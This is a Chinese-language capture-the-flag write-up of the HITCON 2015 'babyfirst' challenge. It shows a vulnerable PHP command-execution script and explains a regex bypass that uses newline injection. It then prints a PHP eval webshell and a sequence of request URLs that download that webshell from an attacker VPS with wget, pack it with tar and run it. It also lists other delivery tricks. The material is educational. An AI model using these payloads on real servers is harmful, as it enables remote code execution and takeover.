# hitcon-2015-babyfirst

```php
 <?php
    highlight_file(__FILE__);

    $dir = 'sandbox/' . $_SERVER['REMOTE_ADDR'];
    if ( !file_exists($dir) )
        mkdir($dir);
    chdir($dir);

    $args = $_GET['args'];
    for ( $i=0; $i<count($args); $i++ ){
        if ( !preg_match('/^\w+$/', $args[$i]) )
            exit();
    }
    exec("/bin/orange " . implode(" ", $args));
?>
```

题目存在几个难点:

1.绕过正则及 /bin/orange 的前缀执行命令

2.写入木马并执行

## 绕过
该问题是正则表达式的一个特性，**`/^\w+$\` 中的 `$` 当遇到字符串的结尾是换行符(%0a)时还是可以匹配**。于是就解决了第一个问题，绕过了正则，同时利用换行符得以执行其他命令。
`http://ip/?args[]=xxx%0a&args[]=touch&args[]=test`

## 写入木马
由于只能传入字母，直接写文件肯定不行，那么只有尝试下载文件了。

### wget 下载
由于 ip 地址的多样性（可参考[IP地址混淆](https://findneo.tech/171125TextualRepresentationOfIPAddress/))，可以使用十进制表示 ip 从而避免使用 `.`。

但又由于 wget 下载不到后台的 php 源码，只能获取 php 解析之后的 html 文件，因此下载之后没有办法直接执行。

### php 执行代码
这里又存在一个知识点：**在 Linux 中 PHP 能够执行非压缩的打包的 PHP 文件**

![php_tar](img/php_tar.png)


## getshell
于是思路就出来了，先在自己的 vps 上创建一个 index.html:

```php
<?php
    file_put_contents('shell.php', '<?php 
    header("Content-Type: text/plain");
    print eval($_POST["cmd"]);
    ?>');
```

接着执行
```
http://ip/?args[]=xxx%0a&args[]=mkdir&args[]=exploit   创建exploit文件夹

http://ip/?args[]=xxx%0a&args[]=cd&args[]=exploit%0a&args[]=wget&args[]=vps十进制地址   进入exploit文件夹，下载 vps 的 index.html文件。

http://ip/?args[]=xxx%0a&args[]=tar&args[]=cvf&args[]=archived&args[]=exploit 压缩文件夹

http://ip/?args[]=xxx%0a&args[]=php&args[]=archived  执行文件
```

## 其他解法
题目的核心就是将 PHP 源文件下载到服务器，因此还存在其他几种解法

```shell
1. busybox ftpget FTP 服务器

2. twistd telnet

3. wget VPS # VPS 302 重定向到 FTP 协议
```

## References
[Babyfirst的分析和解答](https://blog.spoock.com/2017/09/09/Babyfirst-writeup/)